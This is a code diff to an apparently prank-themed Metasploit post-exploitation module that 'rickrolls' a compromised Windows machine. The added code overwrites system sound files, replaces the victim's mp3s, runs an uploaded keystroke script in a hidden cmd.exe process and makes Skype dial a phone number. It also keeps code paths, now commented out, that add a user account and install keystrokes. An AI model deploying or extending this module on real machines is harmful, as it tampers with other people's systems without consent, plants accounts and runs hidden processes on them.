@@ -45,19 +45,24 @@ class Metasploit3 < Msf::Post
 			rickify_system_sounds	
 		elsif datastore["COMMAND"].eql? "rickastleyhotline"
 			call_the_rick_astley_hotline	
+		elsif datastore["COMMAND"].eql? "icons"
+			change_system_icons
+		elsif datastore["COMMAND"].eql? "loadingscreen"
+			change_loading_screen
 		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
 			change_music
 		else
 			# Turn off the keyboard
 			# run all the methods
-			make_rick_astley_cursor
-			print_rick_to_default_printer
-			change_background
-			add_rick_astley_user
-			install_keystrokes
-			change_music		
-			launch_video
+			#make_rick_astley_cursor
+			#print_rick_to_default_printer
+			#change_background
+			#add_rick_astley_user
+			#install_keystrokes
+			#change_music		
+			#launch_video
 			# Turn back on the keyboard
+			print_status "This is the default to blast everything, specify commands until implemented."
 		end
 	end
 	
@@ -193,6 +198,7 @@ class Metasploit3 < Msf::Post
 
 		#Refresh the users' desktop config
 		session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
+		print_status "Background change completed"
 	end
 	
 	def change_music
@@ -202,7 +208,7 @@ class Metasploit3 < Msf::Post
 		rick_mp3_filename = "rick.mp3"
 		rick_mp3 = ::File.join(path, rick_mp3_filename)
 		scan(music_path, rick_mp3)	
-		print_status "Once they find out the mp3s have changed, that gangster will become a sensitive thug."
+		print_status "Music change completed!  Once they find out the mp3s have changed, that gangster will become a sensitive thug."
 	end
 
 	def scan(path, rick_mp3)
@@ -238,20 +244,72 @@ class Metasploit3 < Msf::Post
                 session.fs.file.upload_file("#{temp_keystroke}", rick_keystroke)
 
                 session.sys.process.execute("cmd.exe /c \"#{temp_keystroke}\"", nil, {'Hidden' => true})
-                print_status "Keystroke Lyrics launch completed!"		
+                print_status "Keystroke Lyrics launch completed! Commence laughter!"
 	end
 	
 	def rickify_system_sounds
+		print_status "Modifying some of the default system sounds"
 		sysinfo = session.sys.config.sysinfo
                 winver = sysinfo["OS"]		
-		if winver == "Windows 7"
-		elsif winver == "Windows XP"
+		print_status "winver is: " + winver
+		rick_system_sounds_path = ::File.join(Msf::Config.install_root, "data", "post")
+		rick_system_sounds_path = ::File.join(rick_system_sounds_path, "rickloaf_system_sounds")
+		win_media_path = "C:\\WINDOWS\\media"
+		if winver=~/Windows 7/
+			# TODO CHANGE TO THE REGISTRY KEYS
+			rick_system_file_dict = {"Windows Critical Stop.wav" => "CriticalStop.wav",
+			 "Windows Ding.wav" => "Dings.wav",
+			 "Windows Error.wav" => "Error.wav",
+			 "Windows Exclamation.wav" => "Exclamation.wav",
+			 "Windows Logoff Sound.wav" => "Logoff.wav",
+			 "Windows Logon Sound.wav" => "Logon.wav",
+			 "Windows Notify.wav" => "Notifys.wav",
+			 "Windows Pop-up Blocked.wav" => "PopupBlock.wav",
+			 "Windows Shutdown.wav" => "Shutdown.wav",
+			 "Windows Startup.wav" => "Startup.wav"
+			}
+			rick_system_file_dict.each do |remote_rick_filename, local_rick_filename|
+				rick_audio = ::File.join(rick_system_sounds_path, local_rick_filename)
+				media_file = win_media_path + "\\" + local_rick_filename 
+				print_status "uploading #{media_file}"
+				client.fs.file.upload_file(media_file, rick_audio)
+				# TODO Change the registry key of .current for each event in HKCU/ AppEvents/ Schemes/ Apps/ .Default/ <eventname> / .current
+			end
+		elsif winver=~/Windows XP/
+			rick_system_file_dict = {"Windows XP Critical Stop.wav" => "CriticalStop.wav",
+			 "Windows XP Ding.wav" => "Dings.wav",
+			 "Windows XP Error.wav" => "Error.wav",
+			 "Windows XP Exclamation.wav" => "Exclamation.wav",
+			 "Windows XP Logoff Sound.wav" => "Logoff.wav",
+			 "Windows XP Logon Sound.wav" => "Logon.wav",
+			 "Windows XP Notify.wav" => "Notifys.wav",
+			 "Windows XP Pop-up Blocked.wav" => "PopupBlock.wav",
+			 "Windows XP Shutdown.wav" => "Shutdown.wav",
+			 "Windows XP Startup.wav" => "Startup.wav"
+			}
+			rick_system_file_dict.each do |remote_rick_filename, local_rick_filename|
+				rick_audio = ::File.join(rick_system_sounds_path, local_rick_filename)
+				media_file = win_media_path + "\\" +remote_rick_filename 
+				print_status "uploading #{media_file}"
+				client.fs.file.upload_file(media_file, rick_audio)
+			end
 		end
+		print_status "Default system sounds modification completed! "
 	end
 
 	def call_the_rick_astley_hotline
+		print_status "Calling the Rick Astley Hotline!"
 		skype = "\"C:\\Program Files\\Skype\\Phone\\Skype.exe\""
-                session.sys.process.execute("#{skype} /callto:+17722574501", nil, {'Hidden' => false})
+                session.sys.process.execute("#{skype} /callto:+17722574501", nil, {'Hidden' => false}) # muhahaha
+		print_status "Callto command complete! I WANT YOU TO HEAR MY RAP ALBUM, BAMMMMMMMM!"
+	end
+	
+	def change_system_icons
+		#TODO UPLOAD VARIOUS .ico files, refer to this to get key to change => http://www.virtualplastic.net/html/icn_reg.html		
+	end
+	
+	def change_loading_screen
+		#TODO implement Ian's windows loading screen
 	end
 
 end
